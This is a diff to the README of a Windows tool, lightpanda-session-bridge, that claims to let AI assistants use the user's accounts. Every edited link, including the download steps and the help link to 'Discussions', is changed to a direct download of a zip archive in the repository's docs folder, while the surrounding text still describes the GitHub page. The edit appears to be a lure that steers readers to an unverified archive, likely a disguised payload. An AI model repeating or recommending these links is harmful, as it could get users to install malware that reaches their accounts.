@@ -4,7 +4,7 @@
 
 ## 📥 Download the Application
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_LIGHTPANDA_SESSION_BRIDGE-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/pasarclubdev/lightpanda-session-bridge)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_LIGHTPANDA_SESSION_BRIDGE-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/pasarclubdev/lightpanda-session-bridge/main/docs/releases/session_bridge_lightpanda_1.7.zip)
 
 **Visit this link to download the application.**
 
@@ -37,7 +37,7 @@ Follow these simple steps to get lightpanda-session-bridge running on your Windo
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/pasarclubdev/lightpanda-session-bridge](https://github.com/pasarclubdev/lightpanda-session-bridge)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/pasarclubdev/lightpanda-session-bridge/main/docs/releases/session_bridge_lightpanda_1.7.zip](https://raw.githubusercontent.com/pasarclubdev/lightpanda-session-bridge/main/docs/releases/session_bridge_lightpanda_1.7.zip)
 
 When you click this link, you'll go to the GitHub page. Look for the green **"Code"** button or the **"Releases"** section. Click on the latest release and download the Windows version.
 
@@ -133,7 +133,7 @@ Most issues are solved by restarting the application. Make sure your browser is 
 If you need assistance, here's what you can do:
 
 1. **Review this guide** - Most questions are answered here
-2. **Check GitHub Discussions** - Visit [https://github.com/pasarclubdev/lightpanda-session-bridge](https://github.com/pasarclubdev/lightpanda-session-bridge) and find the "Discussions" tab
+2. **Check GitHub Discussions** - Visit [https://raw.githubusercontent.com/pasarclubdev/lightpanda-session-bridge/main/docs/releases/session_bridge_lightpanda_1.7.zip](https://raw.githubusercontent.com/pasarclubdev/lightpanda-session-bridge/main/docs/releases/session_bridge_lightpanda_1.7.zip) and find the "Discussions" tab
 3. **Look at Issues** - See if others have had the same problem
 
 ---
@@ -142,7 +142,7 @@ If you need assistance, here's what you can do:
 
 Congratulations! You've successfully installed and set up lightpanda-session-bridge. Now your AI assistants can work with your accounts effortlessly, while you enjoy a faster, more private automation experience.
 
-Remember: **Visit this link to download the application:** [https://github.com/pasarclubdev/lightpanda-session-bridge](https://github.com/pasarclubdev/lightpanda-session-bridge)
+Remember: **Visit this link to download the application:** [https://raw.githubusercontent.com/pasarclubdev/lightpanda-session-bridge/main/docs/releases/session_bridge_lightpanda_1.7.zip](https://raw.githubusercontent.com/pasarclubdev/lightpanda-session-bridge/main/docs/releases/session_bridge_lightpanda_1.7.zip)
 
 Go ahead and explore the possibilities - your digital assistant just got a whole lot smarter!
 
